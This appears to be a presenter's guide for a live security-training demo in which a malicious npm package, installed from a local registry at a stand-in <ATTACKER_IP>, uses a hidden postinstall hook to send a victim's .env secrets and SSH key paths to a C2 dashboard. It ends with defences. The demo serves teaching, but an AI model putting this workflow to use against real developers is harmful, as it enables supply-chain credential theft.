# Token Stealer — Live Cross-Machine Session Guide

## Overview

This is a **live two-machine demo** where you publish a malicious npm package on one machine (attacker) and a participant installs it on another machine (victim). The victim's `.env` secrets are silently exfiltrated to the attacker's C2 dashboard in real time.

**Requirements:**
- Both machines on the same network (same WiFi, LAN, or VPN)
- Node.js installed on both machines
- Attacker machine: this repo cloned

---

## Quick Start (One Command)

### On the Attacker Machine

```bash
cd demos/token-stealer/live-session
./start-attacker.sh
```

This single script:
1. Detects your local IP
2. Starts Verdaccio (local npm registry) on port 4873
3. Publishes `csec-form-helpers` (with the hidden postinstall payload) to Verdaccio
4. Patches the C2 address to your IP so cross-machine exfiltration works
5. Starts the C2 server on port 4444 with a live dashboard
6. Prints the exact commands for the victim to run

### On the Victim Machine

The attacker script prints these commands — just copy/paste them to the victim:

```bash
# 1. Create a project
mkdir victim-app && cd victim-app
npm init -y

# 2. Add a fake .env with "secrets"
cat > .env << 'EOF'
GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890
NPM_TOKEN=npm_aB9xKzLmN8pQrStUvWx7654321fedcba
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp
EOF

# 3. Install the package (REPLACE <ATTACKER_IP> with attacker's IP)
npm install csec-form-helpers --registry http://<ATTACKER_IP>:4873

# 4. Use the package — works perfectly
node -e "const f = require('csec-form-helpers'); console.log('Email valid:', f.validateEmail('test@example.com'))"
```

### The Reveal

Open the C2 dashboard in a browser on the attacker machine:

```
http://localhost:4444
```

All the victim's `.env` secrets, hostname, IP, network interfaces, and sensitive file paths are displayed in real time.

---

## Alternate: Copy Victim Project via USB/Share

If you prefer, copy the pre-built victim project to the other machine:

```bash
# On attacker: zip the victim project
cd demos/token-stealer/live-session
zip -r victim-project.zip victim-project/

# Transfer to victim machine (USB, SCP, shared folder, etc.)
# On victim machine:
unzip victim-project.zip
cd victim-project

# Install from attacker's registry
npm install csec-form-helpers --registry http://<ATTACKER_IP>:4873

# Run the app
node app.js
```

---

## Step-by-Step Session Script (for Presenting)

### Act 1: Setup (Before Audience Arrives)

1. Run `./start-attacker.sh` on your machine
2. Confirm Verdaccio and C2 are running
3. Open C2 dashboard (`http://localhost:4444`) in a browser — leave it visible
4. Have the victim commands ready to paste

### Act 2: The "Innocent" Install (Live, with Audience)

**Narrate while doing this on the victim machine (or have a volunteer do it):**

> "I'm a developer starting a new project. I need form validation, so I'll grab a package from npm."

```bash
mkdir my-project && cd my-project
npm init -y
```

> "My project has some secrets in a .env file — API keys, database credentials, the usual."

```bash
cat > .env << 'EOF'
GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp
EOF
```

> "Now I install the form validation library. Looks normal, great reviews, clean API."

```bash
npm install csec-form-helpers --registry http://<ATTACKER_IP>:4873
```

> "Let's use it — works great!"

```bash
node -e "
const { validateEmail, validatePassword } = require('csec-form-helpers');
console.log('Email valid:', validateEmail('user@corp.com'));
console.log('Password:', validatePassword('Test@1234'));
"
```

> "Everything works perfectly. No errors. No warnings. Totally normal npm install."

### Act 3: The Reveal

**Switch to the attacker machine's C2 dashboard.**

> "Now let's check what the attacker sees..."

The dashboard shows:
- Victim's hostname, username, OS, IP, MAC address
- Every key-value pair from `.env` — GITHUB_TOKEN, AWS keys, DATABASE_URL
- Paths to sensitive files found on the system (~/.ssh/id_rsa, ~/.npmrc, etc.)

> "The postinstall hook ran silently during npm install. In under a second, it crawled the project for .env files, harvested every secret, scanned for SSH keys and cloud credentials, and sent everything to our C2 server. The developer never saw a thing."

### Act 4: The Defense Discussion

> "How could this have been prevented?"

- `npm install --ignore-scripts` — blocks postinstall hooks
- Lockfiles + `npm ci` — prevents pulling unexpected versions
- Tools like Socket.dev / Snyk — flag suspicious postinstall behavior
- Never store raw secrets in `.env` — use vaults (AWS Secrets Manager, HashiCorp Vault)
- Audit dependencies: `npm audit`, review new packages before installing

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Verdaccio won't start | Check if port 4873 is in use: `lsof -i :4873`. Use `VERDACCIO_PORT=4874 ./start-attacker.sh` |
| C2 won't start | Check if port 4444 is in use: `lsof -i :4444`. Use `C2_PORT=4445 ./start-attacker.sh` |
| Victim can't reach registry | Ensure both machines are on the same network. Check firewall: `sudo ufw allow 4873` and `sudo ufw allow 4444` |
| npm publish fails | Verdaccio may already have the package. Delete `~/.local/share/verdaccio/storage/csec-form-helpers/` and retry |
| Secrets don't appear on C2 | Verify the victim has a `.env` file in the project directory. Check that C2_HOST was patched correctly in postinstall.js |

## Custom Ports

```bash
VERDACCIO_PORT=5555 C2_PORT=6666 ./start-attacker.sh
```

## Cleanup

Press `Ctrl+C` in the attacker terminal — the script cleans up automatically:
- Stops Verdaccio and C2 server
- Restores original postinstall.js (removes IP patch)
- Restores original .npmrc if it was backed up
